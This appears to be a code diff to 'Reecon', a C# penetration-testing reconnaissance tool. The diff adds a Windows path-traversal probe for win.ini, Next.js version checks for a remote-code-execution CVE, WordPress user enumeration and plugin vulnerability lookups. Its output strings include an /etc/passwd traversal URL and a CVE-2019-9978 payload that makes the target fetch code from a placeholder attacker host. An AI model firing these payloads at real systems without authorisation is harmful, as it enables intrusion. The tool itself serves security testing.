@@ -86,6 +86,22 @@ namespace Reecon
                     Console.WriteLine("- Subdomains Discovered! Need to add them to your hosts file.");
                     Console.WriteLine(subDomains);
                 }
+
+                if (scanURL.EndsWith('/'))
+                {
+                    Console.WriteLine("Ending / detected - Searching for directory-based traversals...");
+                    List<string> windowsTraversals = new List<string>();
+                    // https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Directory%20Traversal/Intruder/traversals-8-deep-exotic-encoding.txt
+                    windowsTraversals.Add(@"..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini");
+                    foreach (string traversal in windowsTraversals)
+                    {
+                        var webInfo = Web.GetHttpInfo(scanURL + traversal, AllowDangerousPaths: true);
+                        if (webInfo.PageText != null && webInfo.PageText.Contains("for 16-bit app support"))
+                        {
+                            Console.WriteLine("- " + $"Successful Windows Traversal: {scanURL + traversal}".Recolor(Color.Orange));
+                        }
+                    }
+                }
             }
 
             Console.WriteLine("Web Info Scan Finished");
@@ -853,6 +869,7 @@ namespace Reecon
                 Console.WriteLine("www detected - Existing subdomains are ignored when searching for subdomains - Stripping...");
                 url = url.Replace("://www.", "://"); // Technically an issue if that's in a query string value or something, but it should be fine
             }
+
             string toReturn = "";
             Uri uri = new Uri(url);
             string baseHost = uri.Host;
@@ -861,7 +878,7 @@ namespace Reecon
 
             string domainToCheck = scheme + "://" + authority + "/";
             // Common to uncommon-ish - Maybe alphabetical later?
-            List<string> subdomains = ["www", "dev", "admin", "mail", "test", "nagios", "ftp", "status", "gitea", "storage"];
+            List<string> subdomains = ["www", "dev", "admin", "mail", "test", "panel", "nagios", "ftp", "status", "gitea", "storage"];
 
             var pageInfo = GetHttpInfo(url);
 
@@ -940,7 +957,7 @@ namespace Reecon
             public string? AdditionalInfo { get; set; }
         }
 
-        public static HttpInfo GetHttpInfo(string url, string? UserAgent = null, string? Cookie = null, string? HostHeader = null, int Timeout = 5)
+        public static HttpInfo GetHttpInfo(string url, string? UserAgent = null, string? Cookie = null, string? HostHeader = null, int Timeout = 5, bool AllowDangerousPaths = false)
         {
             HttpInfo toReturn = new();
             HttpStatusCode statusCode = new();
@@ -1025,7 +1042,14 @@ namespace Reecon
                 };
 
             HttpClient httpClient = new HttpClient(httpClientHandler);
-            Uri theUrl = new Uri(url);
+
+            // Else it strips out paths which is problematic for path traversal testing
+            var disableDangerousPaths = new UriCreationOptions
+            {
+                DangerousDisablePathAndQueryCanonicalization = AllowDangerousPaths
+            };
+
+            Uri theUrl = new Uri(url, disableDangerousPaths);
             HttpRequestMessage httpClientRequest = new HttpRequestMessage(HttpMethod.Get, theUrl);
 
             // Now for the optional parameters
@@ -1630,6 +1654,49 @@ namespace Reecon
                     {
                         toReturn += "-- " + "JBoss Detected - Run jexboss - https://github.com/joaomatosf/jexboss <-----".Recolor(Color.Orange) + Environment.NewLine;
                     }
+                    
+                    // Next.js
+                    else if (poweredBy == "Next.js")
+                    {
+                        Console.WriteLine("- Next.js detected");
+                        if (pageText != null)
+                        {
+                            List<string> chunks = pageText.Split(new[] { "/_next/static/chunks/" }, StringSplitOptions.RemoveEmptyEntries).ToList();
+
+                            // Only keep the JS ones
+                            chunks = chunks.Where(x => x.Contains(".js\"")).ToList();
+
+                            // Go through each, download them, and search for the version
+                            foreach (string chunk in chunks)
+                            {
+                                string jsPath = chunk.Substring(0, chunk.IndexOf('"'));
+                                var jsDownload = Web.DownloadString($"{urlWithSlash}_next/static/chunks/{jsPath}");
+                                if (jsDownload.StatusCode == HttpStatusCode.OK)
+                                {
+                                    string jsString = jsDownload.Text;
+                                    if (jsString.Contains("window.next={version:\""))
+                                    {
+                                        string version = jsString.Remove(0, jsString.IndexOf("window.next={version:\"") + 22);
+                                        version = version.Substring(0, version.IndexOf('"'));
+                                        Console.WriteLine($@"-- Version: {version}");
+
+                                        // https://www.dynatrace.com/news/blog/cve-2025-55182-react2shell-critical-vulnerability-what-it-is-and-what-to-do/
+                                        if (version.StartsWith("16.") && Version.Parse(version) < Version.Parse("16.0.7"))
+                                        {
+                                            Console.WriteLine("-- " + "Vulnerable to CVE-2025-55182 (React2Shell) - https://raw.githubusercontent.com/xalgord/React2Shell/refs/heads/master/react2shell.py".Recolor(Color.Red));
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine("Either not 16. or not vulnerable to React2Shell (CVE-2025-55182) - If 15.x or lower, bug Reelix!");
+                                        }
+
+                                        break;
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    
                     // Strapi
                     else if (poweredBy == "Strapi <strapi.io>")
                     {
@@ -1753,7 +1820,7 @@ namespace Reecon
                 // X-Matched-Path ?
                 responseHeaders.Remove("X-Content-Type-Options");
                 responseHeaders.Remove("X-UA-Compatible");
-                
+
                 // Keep these 2 for XSS... ?
                 responseHeaders.Remove("X-Frame-Options");
                 responseHeaders.Remove("X-XSS-Protection");
@@ -1806,6 +1873,14 @@ namespace Reecon
                         if (pageText != null && pageText.Contains("Version 1.2.22"))
                         {
                             toReturn += "-- " + "Vulnerable version 1.2.22 detected - CVE-2022-46169" + Environment.NewLine;
+                        }
+                        
+                        // May be duped - Will fix later if there's a second 1.2.22
+                        if (pageText != null && pageText.Contains("versionInfo'>Version "))
+                        {
+                            string versionInfo = pageText.Remove(0, pageText.IndexOf("versionInfo'>Version ") + 21);
+                            versionInfo = versionInfo.Substring(0, versionInfo.IndexOf('|') - 1).Trim();
+                            toReturn += "-- " + $"Version {versionInfo}".Recolor(Color.Orange) + Environment.NewLine;
                         }
                         else
                         {
@@ -1990,7 +2065,6 @@ namespace Reecon
                                         }
                                     }
                                 }
-                                
                             }
                             else
                             {
@@ -2265,6 +2339,7 @@ namespace Reecon
                     }
 
                     // Basic User Enumeration - Need to combine these two...
+                    // There's also /wordpress/?author=2 and so on which lists users not found in these
                     List<string> wpUsers = [];
                     var wpUserTestOne = Web.GetHttpInfo($"{baseUrl}/wp-json/wp/v2/users");
                     if (wpUserTestOne.StatusCode == HttpStatusCode.OK && wpUserTestOne.PageText != null)
@@ -2288,9 +2363,9 @@ namespace Reecon
                         JsonDocument document = JsonDocument.Parse(wpUserTestTwo.PageText);
                         foreach (JsonElement element in document.RootElement.EnumerateArray())
                         {
-                            string wpUserName = element.GetProperty("name").GetString() ?? "";
-                            string wpUserSlug = element.GetProperty("slug").GetString() ?? "";
-                            if (!wpUsers.Contains(wpUserName) && wpUserName != "")
+                            string? wpUserName = element.GetProperty("name").GetString();
+                            string? wpUserSlug = element.GetProperty("slug").GetString();
+                            if (wpUserName != null && wpUserSlug != null && !wpUsers.Contains(wpUserName))
                             {
                                 wpUsers.Add(wpUserSlug);
                                 toReturn += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Recolor(Color.Orange) + Environment.NewLine;
@@ -2313,18 +2388,30 @@ namespace Reecon
                             pluginSearcher.RemoveAt(0);
                         }
 
+                        string homePath = Environment.GetEnvironmentVariable("HOME") ?? ""; // On Linux - HOMEPATH on Windows - May add later.
+                        string wordfenceFileLocation = homePath + "/.local/share/reecon/wordfence.json";
+                        bool hasWordfence = false;
+                        string wordfenceData = "";
+                        if (File.Exists(wordfenceFileLocation))
+                        {
+                            toReturn += " -- Wordfence file Found - Database Loaded" + Environment.NewLine;
+                            hasWordfence = true;
+                            wordfenceData = File.ReadAllText(wordfenceFileLocation);
+                        }
+
                         List<string> pluginList = new List<string>();
+
                         foreach (string plugin in pluginSearcher)
                         {
                             // Plugin Found: adrotate/library/jquery.adrotate.clicktracker.js
                             // /wp-content/plugins/adrotate/readme.txt
-                            string thePlugin = plugin.Substring(0, plugin.IndexOf(' ') - 1);
-                            thePlugin = thePlugin.Substring(0, thePlugin.IndexOf('/'));
-                            if (!pluginList.Contains(thePlugin))
+                            string pluginName = plugin.Substring(0, plugin.IndexOf(' ') - 1);
+                            pluginName = pluginName.Substring(0, pluginName.IndexOf('/'));
+                            if (!pluginList.Contains(pluginName))
                             {
-                                pluginList.Add(thePlugin);
-                                toReturn += "-- " + $"Plugin Found: {thePlugin}".Recolor(Color.Orange) + Environment.NewLine;
-                                if (thePlugin == "social-warfare")
+                                pluginList.Add(pluginName);
+                                toReturn += "-- " + $"Plugin Found: {pluginName}".Recolor(Color.Orange) + Environment.NewLine;
+                                if (pluginName == "social-warfare")
                                 {
                                     toReturn += "--- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Recolor(Color.Orange) +
                                                 $" - {urlWithSlash}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
@@ -2332,16 +2419,16 @@ namespace Reecon
                                     toReturn += $"---- Verify Version: {urlWithSlash}wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
                                 }
                                 // html5-video-player-pro VS html5-video-player-pro-pro
-                                else if (thePlugin.StartsWith("html5-video-player-pro"))
+                                else if (pluginName.StartsWith("html5-video-player-pro"))
                                 {
                                     toReturn += "--- " + "Possible Vulnerable Plugin (HTML5 Video Player Pro) Detected (Vuln if < 2.5.25) - CVE-2024-1061".Recolor(Color.Orange) + Environment.NewLine;
                                 }
-                                else if (thePlugin == "wp-with-spritz")
+                                else if (pluginName == "wp-with-spritz")
                                 {
                                     // Not even a CVE - Lame
                                     toReturn += "--- " + "Vulnerable Plugin Detected".Recolor(Color.Orange) + $" - {urlWithSlash}wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
                                 }
-                                else if (thePlugin == "really-simple-ssl")
+                                else if (pluginName == "really-simple-ssl")
                                 {
                                     toReturn += "--- " + "Possible Vulnerable Plugin (Really Simple Security) Detected (Vuln if 9.0.0 -> 9.1.1.1) - CVE-2024-10924".Recolor(Color.Orange) + Environment.NewLine;
                                 }
@@ -2353,7 +2440,7 @@ namespace Reecon
                                 else
                                 {
                                     // I haven't set anything specific - Look for some versions
-                                    string readmeLoc = $"{urlWithSlash}wp-content/plugins/{thePlugin}/readme.txt";
+                                    string readmeLoc = $"{urlWithSlash}wp-content/plugins/{pluginName}/readme.txt";
                                     var pluginReadme = Web.GetHttpInfo(readmeLoc);
                                     if (pluginReadme.StatusCode == HttpStatusCode.OK && pluginReadme.PageText?.Length > 0)
                                     {
@@ -2368,7 +2455,7 @@ namespace Reecon
                                     // Some use changelog.txt instead
                                     else
                                     {
-                                        string changelogLoc = $"{urlWithSlash}wp-content/plugins/{thePlugin}/changelog.txt";
+                                        string changelogLoc = $"{urlWithSlash}wp-content/plugins/{pluginName}/changelog.txt";
                                         var changelogReadme = Web.GetHttpInfo(changelogLoc);
                                         if (changelogReadme.StatusCode == HttpStatusCode.OK)
                                         {
@@ -2377,6 +2464,43 @@ namespace Reecon
                                         }
                                     }
                                 }
+
+                                // TODO: Version Filtering if the version was detected above
+                                if (hasWordfence)
+                                {
+                                    bool foundEntry = false;
+                                    using (JsonDocument document = JsonDocument.Parse(wordfenceData))
+                                    {
+                                        var root = document.RootElement;
+                                        var entries = root.EnumerateObject();
+                                        // Limit by Software
+                                        foreach (JsonProperty entryItem in entries)
+                                        {
+                                            entryItem.Value.TryGetProperty("software", out JsonElement entrySoftware);
+                                            var softwareEntries = entrySoftware.EnumerateArray();
+                                            foreach (JsonElement softwareItem in softwareEntries)
+                                            {
+                                                if (softwareItem.TryGetProperty("slug", out JsonElement softwareSlug) && softwareSlug.GetString() == pluginName)
+                                                {
+                                                    foundEntry = true;
+                                                    toReturn += "--- " + "Wordfence Entry Found".Recolor(Color.Orange) + Environment.NewLine;
+                                                    string? title = entryItem.Value.GetProperty("title").GetString();
+                                                    string? description = entryItem.Value.GetProperty("description").GetString();
+                                                    string? cve = entryItem.Value.GetProperty("cve").GetString();
+                                                    toReturn += "---- " + $"Title: {cve} - {title}" + Environment.NewLine;
+                                                    toReturn += "---- " + $"Description: {description}" + Environment.NewLine;
+                                                }
+                                            }
+                                        }
+                                    }
+
+                                    if (!foundEntry)
+                                    {
+                                        toReturn += $"--- No Wordfence Entry Found for {pluginName} - Probably not vulnerable." + Environment.NewLine;
+                                    }
+                                }
+                                
+                                // Themes?
                             }
                         }
                     }
